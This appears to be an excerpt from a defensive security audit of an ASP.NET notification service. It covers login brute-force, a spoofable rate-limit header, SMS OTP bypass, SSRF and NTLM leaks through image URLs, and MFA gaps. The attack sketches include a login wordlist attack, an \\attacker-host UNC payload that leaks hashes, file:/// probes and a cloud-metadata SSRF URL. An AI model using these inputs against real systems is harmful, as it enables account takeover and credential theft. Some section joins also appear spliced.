**BF-1 — No account lockout.** `Login` (`AuthController.cs:430`) verifies passwords with `UserManager.CheckPasswordAsync`, which never increments `AccessFailedCount` and never consults `IsLockedOutAsync`; the app uses `AddIdentityCore` with no `opts.Lockout` block and no `SignInManager` (`Program.cs:37-46`). The `LockoutEnd`/`AccessFailedCount` columns exist in the schema but are dead — grepping `SignInManager|IsLockedOutAsync|AccessFailedAsync|CheckPasswordSignInAsync` across `src` returns zero hits. **Why it matters:** the owner's #1 threat. With weak defaults (8 chars, no upper/symbol required) and zero per-account ceiling, a guessable SuperAdmin password is takeable. **Attack:** POST `/api/auth/login` with a fixed target email and a wordlist; the account never locks; the only friction is the per-IP limiter, itself bypassable (BF-2). **Direction (do not apply):** wire Identity lockout (`opts.Lockout` + `AccessFailedAsync`/`ResetAccessFailedCount`) or move to `SignInManager.CheckPasswordSignInAsync(lockoutOnFailure:true)`. Confidence: High.

**BF-2 — Rate-limit partition keyed on a spoofable header.** `login-per-ip` (10/5min), `login-sms-per-ip` (5/15min) and `trial-register-per-ip` (5/hr) all derive the partition key from `ctx.Request.Headers["CF-Connecting-IP"]` (`Program.cs:153/169/185`); `AuthController.ClientIp()` (`:267-277`) trusts `CF-Connecting-IP` then `X-Forwarded-For`. Nothing strips/validates these: `UseForwardedHeaders` has no `KnownProxies`/`KnownNetworks` (`Program.cs:300-303`), `AllowedHosts` is `"*"`, and the prod nginx (`infrastructure/nginx/toast.conf:73-79`) does not overwrite `CF-Connecting-IP`. **Why it matters:** an attacker reaching the origin directly (or any non-Cloudflare path) sets a fresh header value per request → a brand-new full rate-limit bucket every time → the only brute-force control (for BF-1 and BF-3) evaporates; it is also per-IP-only, so even genuine Cloudflare traffic permits distributed credential-stuffing. **Direction:** only honour `CF-Connecting-IP` when the peer is a verified Cloudflare egress range (or have nginx unconditionally overwrite it), restrict `ForwardedHeaders` with `KnownNetworks`, bind Kestrel to loopback, and add a per-account counter. Confidence: High. *(Filed independently by 3 perspectives; merged.)*

**BF-3 — SMS-MFA OTP is brute-forceable.** `VerifyLoginSms` (`AuthController.cs:488-492`) returns `Unauthorized` on a wrong code **without** clearing `SmsVerificationCode`/`SmsCodeExpiry` — the same 6-digit code stays valid for the full 10-minute window (`:449`); there is no per-account failed-attempt counter, and `Login` hands the attacker the target `userId` in the challenge response (`:455`). Identical no-invalidate pattern at `MfaVerifySms` (`:573-580`). Code space is 10⁶ (`GenerateSmsCode :232-239`). **Why it matters:** SMS is the second factor for every phone-confirmed user incl. SuperAdmins; with BF-2 defeating the 5/15min cap, the live code is brute-forceable inside its window → MFA bypass after a known/sprayed password, turning "MFA-protected" accounts into single-factor. **Direction:** cap OTP attempts per account, invalidate the code after N failures and on expiry, tie the limiter to the user id, consider a longer code / shorter window. Confidence: High.

Grepping `mfa` in this file returns only the unrelated `SsoRequireMfa` pass-through — there is **no** `User.FindFirstValue("mfa")` check, unlike `NotificationsController.cs:71`. **AGT-1 — Toast hero/logo image URLs accept any scheme → SSRF / NetNTLM leak.** `SendNotificationRequest.HeroImageUrl`/`LogoUrl` are free-form with no scheme validation (`NotificationDtos.cs:10-11`); `Send` stores them verbatim (`NotificationsController.cs:157-158`) and `NotificationPayloadBuilder.BuildSigned` HMAC-signs them as-is (`:34-35`). A `\\attacker-host\share\x.png` UNC value parses as `file://` and the Windows image loader opens an SMB session, leaking the interactive user's NetNTLMv2 hash; `file:///c:/…` probes local files; `http://169.254.169.254/…` makes every endpoint beacon an internal URL. The send path carrying these fields requires **no MFA** (the gate is `All`-only, MFA-2) and is reachable by a **Technician** for any single-device/small-group target. The lock-screen path is constrained to `/assets/lockscreen/`; these image fields are the un-constrained sibling. *(Reachable by any authenticated tenant user weaponising their own fleet — intra-tenant, hence High not Critical; the residual SMB-fetch step is well-established WinRT image-loader behaviour, hence exploitability Likely.)* **Direction:** validate `HeroImageUrl`/`LogoUrl` to absolute http(s) (ideally same-origin `/assets`) on the way in, and harden the agent's `TryUri` to reject non-http(s) like `TryHttpUri` already does. Confidence: High. *(Filed by INJ + AGENT perspectives; merged.)*

**CFG-1 — JWT key falls back to a committed public placeholder that passes the length guard.** `appsettings.json:23` ships `Jwt:Key = "REPLACE-THIS-WITH-A-STRONG-SECRET-KEY-IN-PRODUCTION-MIN-32-CHARS"` (63 chars). Confidence: High. *(Independently verified by the reviewer — not surfaced by the fleet; included for completeness.)*

**MFA-6 — SSO sessions can never satisfy the MFA gate, and the lock-screen path they reach has none.** The SSO callback issues a plain `CreateUserToken` (`SsoController.cs:195`) which never adds `mfa=true`, even when `identity.MfaSatisfied` was true and `SsoRequireMfa` was enforced (`:154`). Confidence: High (verifier raised Low→Medium).

**MFA-7 — SMS elevation re-uses the login factor.** `mfa/verify-sms` (`AuthController.cs:562-589`) mints a full `mfa=true` token after verifying an SMS code sent to the already-confirmed phone — the *same* code type/fields/channel that `Login` already used to authenticate SMS users (`:444-456, 488`). - **Moderation approval re-enqueues a held broadcast bypassing MFA** (`ModerationController.cs:60-82`) — the `TargetType.All` MFA gate runs *before* persistence, so any held `All` row already passed MFA at submission; approval re-enqueues an already-MFA'd send.
- **`RequestUninstall` no-MFA** (`DevicesController.cs:344-385`) — per-device only (no bulk variant), tenant-scoped, audited; and it *reverts* the lock screen (removes branding), it does not push rogue imagery. Consistent with the implemented model.
- **`platformAdmin` satisfies `IsAdmin()` in DevicesController** (`:388-392`) — tenant-scoped by `device.TenantId != tenantId ⇒ NotFound`; the platform admin's token keeps their *home* tenantId, so no cross-tenant reach, no new capability.
- **Hub joins `device-{id}` without re-checking `device.TenantId` == token tenantId** (`NotificationHub.cs:36-57`) — both claims are minted from one `Device` row (`CreateDeviceToken`), structurally bound; a mismatched token would require forging the HMAC.
- **Stripe webhook DoS / replay / fire-and-forget** (`BillingController.cs:237-321`) — body bounded by Kestrel 30 MB + nginx `client_max_body_size`; handlers are idempotent setters; the fire-and-forget reliability gap doesn't gate sends (no send path checks billing status). Reliability, not security.
- **Registration returns `SigningKey` to every device** (`DevicesController.cs:145`) — by design (the key is the shared per-tenant toast-verify secret every agent already holds); possessing it gives no delivery path to other devices.
- **ForwardedHeaders IP-spoofing into audit rows** (`Program.cs:300-303`) — the audit sinks read `Connection.RemoteIpAddress`; the loopback-only default `KnownNetworks` + nginx appending the real client as the rightmost XFF hop means the spoofed value is never consumed. (The genuinely spoofable surface is BF-2's `CF-Connecting-IP`, filed separately.)
- **`X-Forwarded-Host` lock-screen image redirection** (`DevicesController.cs:415-421`) — the absolutized URL is returned only to the *caller's own* request and never persisted/cross-delivered; the agent sends no such header and enforces HTTPS `ServerUrl`.
- **AudioSetting `file://` UNC NTLM leak** (`ToastTemplates.cs:444-449`) — the Windows toast *audio* path does not fetch remote/UNC sources (unlike images); degrades to default sound. (The real audio issue is the lesser AGT-3.)
- **Template `ActionButtonsJson`/image URLs stored raw** (`TemplatesController.cs:68-70`) — the Send path rebuilds the Notification from the request body, never from the stored template; the template field is never deserialized into an agent payload.
- **Asset upload `Host`-header poisoning into the lock-screen chain** (`AssetsController.cs:117`) — the lock-screen normalizer strips scheme+host and only accepts `/assets/lockscreen/`. (The residual host-injection into the *stored asset URL* / hero path is the lesser CFG-4.)
- **`LockScreenService` rogue-server SSRF primitive** (`LockScreenService.cs:56-72`) — the only path to an attacker `ImageUrl` is a fully-compromised API server, which already controls the whole fanout; server-side normalizer closes the admin/API paths. (Downgraded to AGT-4 hardening.)
- **`DeviceGroupsController` read posture / membership reads** (`:103-117`) — tenant-safe: the group lookup is tenant-filtered before the membership query; no cross-tenant rows reachable.
